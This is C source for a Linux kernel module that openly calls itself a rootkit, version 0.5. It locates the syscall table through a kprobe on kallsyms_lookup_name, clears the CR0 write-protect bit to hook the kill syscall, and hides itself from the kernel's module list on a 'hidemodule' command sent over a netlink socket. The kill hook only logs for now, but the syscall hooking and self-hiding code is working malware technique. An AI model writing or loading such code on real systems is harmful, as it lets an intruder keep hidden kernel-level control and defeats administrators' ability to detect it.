#include <linux/module.h>
#include <net/sock.h>
#include <linux/kprobes.h>

#define LICENCE "GPL"
#define DESCRIPTION "Rootkit that can hide arbitrary ressources by using the configure command line tool."
#define AUTHOR "Benjamin Haag"
#define VERSION "0.5"

#define NETLINK_PROTOCOL 31

#define NUM_SYSCALLS 333

MODULE_LICENSE(LICENCE);
MODULE_DESCRIPTION(DESCRIPTION);
MODULE_AUTHOR(AUTHOR);
MODULE_VERSION(VERSION);





/***********************************************************
*          HOOK SYSTEM CALLS                               *
***********************************************************/

static struct pt_regs ** sys_call_table;
int (*original[NUM_SYSCALLS])(const struct pt_regs * regs);

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

typedef unsigned long (*kallsyms_lookup_name_t)(const char * name);
kallsyms_lookup_name_t kallsyms_lookup_name_alt;

static int find_sys_call_table(void) {
    register_kprobe(&kp);
    kallsyms_lookup_name_alt = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);

    sys_call_table = (struct pt_regs **)kallsyms_lookup_name_alt("sys_call_table");

    if (sys_call_table == NULL)
        return -1;

    return 0;
}

unsigned long int cr0;
unsigned long int cr0_new;

static int set_wp(int bit) {
    cr0 = read_cr0();
    cr0 &=~(1<<16);
    cr0 |= bit << 16;
    __asm__ __volatile__ ("mov %0, %%cr0":"+r"(cr0));
    
    cr0_new = read_cr0();
    if(cr0 != cr0_new)
        return -1;
    return 0;
}

static int hook(unsigned int syscall_number, int (*callback)(const struct pt_regs *)) {
    if (set_wp(0) == -1) {
        return -1;
    }
    original[syscall_number] = (int (*)(const struct pt_regs *))sys_call_table[syscall_number];
    sys_call_table[syscall_number] = (struct pt_regs *)callback;
    if (set_wp(1) == -1) {
        return -1;
    }
    return 0;
}

static int unhook(unsigned int syscall_number) {
    if (set_wp(0) == -1) {
        return -1;
    }
    sys_call_table[syscall_number] = (struct pt_regs *)original[syscall_number];
    if (set_wp(1) == -1) {
        return -1;
    }
    return 0;
}





/***********************************************************
*          NEW SYSTEM CALLS                                *
***********************************************************/

int my_kill(const struct pt_regs * regs) {
    printk(KERN_INFO "Rootkit: kill hooked! Now invoking original kill system call handler...\n");
    return original[__NR_kill](regs);
}





/***********************************************************
*          CONFIGURE MODULE                                *
***********************************************************/

static struct list_head *prev_save;

static void hidemodule(void) {
    if (prev_save) return;
    prev_save = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

static void showmodule(void) {
    if (!prev_save) return;
    list_add(&THIS_MODULE->list, prev_save);
}

static char * configure(const char * command) {
    if (strcmp(command, "hidemodule") == 0) {
        hidemodule();
        return "Module is now hidden.";
    }
    if (strcmp(command, "showmodule") == 0) {
        showmodule();
        return "Module is now shown.";
    }
    return "Error: unknowm command!";
}





/***********************************************************
*          NETLINK COMMUNICATION                           *
***********************************************************/

struct sock *nl_sock = NULL;

static void nl_recv_msg(struct sk_buff *);
struct netlink_kernel_cfg cfg = {
    .input = nl_recv_msg,
};

struct nlmsghdr *nlh;
struct sk_buff *skb_out;
char * msg;
int pid;
int msg_len;
int res;

static int create_socket(void) {
    nl_sock = netlink_kernel_create(&init_net, NETLINK_PROTOCOL, &cfg);
    if(!nl_sock) {
        return -1;
    }
    return 0;
}

static void close_socket(void) {
    netlink_kernel_release(nl_sock);
    nl_sock = NULL;
}

static void nl_recv_msg(struct sk_buff * skb) {

    // get data from packet
    nlh = (struct nlmsghdr*)skb->data;
    msg = (char *)nlmsg_data(nlh);
    pid = nlh->nlmsg_pid;

    printk(KERN_INFO "Received: %s (%ld Bytes)\n", msg, strlen(msg));

    // prepare response data
    msg = configure(msg);
    msg_len = strlen(msg);

    // allocate space for message
    skb_out = nlmsg_new(msg_len, 0);
    if(!skb_out) {
        printk(KERN_ERR "Failed to allocate new skb\n");
        return;
    }

    // pack response
    nlh=nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_len, 0);
    NETLINK_CB(skb_out).dst_group = 0;
    strncpy(nlmsg_data(nlh), msg, msg_len);

    // send packet
    res = nlmsg_unicast(nl_sock, skb_out, pid);
    if (res == -1) {
        printk(KERN_ALERT "Error sending response\n");
    }
}





/***********************************************************
*          MODULE SETUP                                    *
***********************************************************/

static int __init
module_load(void) {

    printk(KERN_INFO "Rootkit: loaded. Hello!\n");

    if(create_socket() != 0) {
        printk(KERN_ERR "Rootkit: unable to create socket!");
        return -1;
    }

    if(find_sys_call_table() == -1) {
        printk(KERN_ERR "Rootkit: could not find sys_call_table :(\n");
        return -1;
    }

    // Rootkit should not return past this point. Once a syscall
    // is hooked and the module unexpectedly unloads, the system
    // will crash.

    if(hook(__NR_kill, my_kill) != 0) {
        printk(KERN_ERR "Rootkit:");
    }

    return 0;
}

static void __exit
module_unload(void) {

    if(unhook(__NR_kill) != 0) {
        printk(KERN_ERR "Rootkit:");
    }

    close_socket();

    printk(KERN_INFO "Rootkit: unloaded. Bye Bye!\n");

}


module_init(module_load);
module_exit(module_unload);